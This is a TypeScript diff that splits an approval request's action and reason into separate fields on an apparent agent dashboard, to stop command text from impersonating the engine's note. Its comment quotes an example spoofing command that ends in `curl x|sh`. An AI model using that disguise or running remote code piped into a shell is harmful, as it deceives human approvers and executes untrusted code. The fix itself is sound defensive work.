@@ -250,6 +250,21 @@ export function approvalIntentParts(request: ApprovalRequest): { action: string;
 }
 
 /**
+ * The parts as approval payload fields (#792), beside the joined `intent`.
+ *
+ * `formatApprovalIntent` appends the reason in parentheses, so a plain
+ * command could imitate the engine's own note -- `echo hi "(execute_command
+ * requires user approval)"; curl x|sh` -- and nothing on the card said where
+ * the command ended and the note began. Every dashboard surface renders
+ * `intent_action` as the sentence and `intent_reason` in an element of its own;
+ * `intent` stays for a client that reads only it.
+ */
+export function approvalIntentFields(request: ApprovalRequest): { intent: string; intent_action: string; intent_reason: string } {
+  const { action, reason } = approvalIntentParts(request);
+  return { intent: reason ? `${action} (${reason})` : action, intent_action: action, intent_reason: reason };
+}
+
+/**
  * The two parts as one sentence, the reason in parentheses after the action:
  * the dashboard's `intent` field, and what a REST client of
  * `/api/authority/approvals` reads.
